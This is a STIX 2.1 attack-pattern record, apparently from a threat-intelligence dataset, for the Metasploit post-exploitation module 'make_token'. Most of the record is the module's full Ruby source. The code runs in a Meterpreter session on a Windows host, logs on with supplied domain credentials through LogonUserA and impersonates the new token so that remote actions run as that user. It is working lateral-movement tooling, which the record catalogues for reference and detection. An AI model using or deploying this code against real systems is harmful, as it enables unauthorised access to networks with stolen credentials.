{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f9dc51a6-cf84-48a1-8aeb-4e678a6fb786",
    "created": "2024-08-14T16:33:04.975695Z",
    "modified": "2024-08-14T16:33:04.975699Z",
    "name": "Make Token Command",
    "description": " In its default configuration, this module creates a new network security context with the specified logon data (username, domain and password). Under the hood, Meterpreter's access token is cloned, and a new logon session is created and linked to that token. The token is then impersonated to acquire the new network security context. This module has no effect on local actions - only on remote ones (where the specified credential material will be used). This module does not validate the credentials specified.  'License' => MSF_LICENSE 'Notes' => { 'AKA' => ['make_token', 'maketoken'] 'Stability' => [CRASH_SAFE] 'Reliability' => [REPEATABLE_SESSION] 'SideEffects' => [IOC_IN_LOGS]  'Platform' => ['win'] 'SessionTypes' => ['meterpreter']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/make_token.rb",
            "external_id": "make_token.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Make Token Command',\n        'Description' => %q{\n          In its default configuration, this module creates a new network security context with the specified\n          logon data (username, domain and password). Under the hood, Meterpreter's access token is cloned, and\n          a new logon session is created and linked to that token. The token is then impersonated to acquire\n          the new network security context. This module has no effect on local actions - only on remote ones\n          (where the specified credential material will be used). This module does not validate the credentials\n          specified.\n        },\n        'License' => MSF_LICENSE,\n        'Notes' => {\n          'AKA' => ['make_token', 'maketoken'],\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        },\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Author' => [\n          'Daniel L\u00f3pez Jim\u00e9nez (attl4s)',\n          'Simone Salucci (saim1z)'\n        ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n              stdapi_sys_config_revert_to_self\n              stdapi_sys_config_update_token\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('DOMAIN', [true, 'Domain to use' ]),\n        OptString.new('USERNAME', [true, 'Username to use' ]),\n        OptString.new('PASSWORD', [true, 'Password to use' ])\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptEnum.new('LOGONTYPE', [true, 'The type of logon operation to perform. Using LOGON32_LOGON_INTERACTIVE may cause issues within the session (typically due to the token filtering done by the UserAccountControl mechanism in Windows). Use with caution', 'LOGON32_LOGON_NEW_CREDENTIALS', ['LOGON32_LOGON_BATCH', 'LOGON32_LOGON_INTERACTIVE', 'LOGON32_LOGON_NETWORK', 'LOGON32_LOGON_NETWORK_CLEARTEXT', 'LOGON32_LOGON_NEW_CREDENTIALS', 'LOGON32_LOGON_SERVICE', 'LOGON32_LOGON_UNLOCK']]),\n      ]\n    )\n  end\n\n  def run\n    # Make sure we meet the requirements before running the script\n    fail_with(Failure::BadConfig, 'This module requires a Meterpreter session') unless session.type == 'meterpreter'\n\n    # check/set vars\n    user = datastore['USERNAME']\n    password = datastore['PASSWORD']\n    domain = datastore['DOMAIN']\n    logontype = datastore['LOGONTYPE']\n\n    # revert any existing impersonation before doing a new one\n    print_status('Executing rev2self to revert any previous token impersonations')\n    session.sys.config.revert_to_self\n\n    # create new logon session / token pair\n    print_status(\"Executing LogonUserA with the flag #{logontype} to create a new security context for #{domain}\\\\#{user}\")\n    logon_user = session.railgun.advapi32.LogonUserA(user, domain, password, logontype, 'LOGON32_PROVIDER_DEFAULT', 4)\n\n    if logon_user['return']\n      # get the token handle\n      ph_token = logon_user['phToken']\n      print_status('Impersonating the new security context...')\n\n      # store the token within the server\n      session.sys.config.update_token(ph_token)\n      print_good('The session should now run with the new security context!')\n\n      # send warning\n      if logontype == 'LOGON32_LOGON_NEW_CREDENTIALS'\n        print_warning('Remember that this will not have any effect on local actions (i.e. getuid will still show the original user)')\n      end\n    else\n      print_error(\"LogonUserA call failed, Error Code: #{logon_user['GetLastError']} - #{logon_user['ErrorMessage']}\")\n    end\n  end\nend\n"
}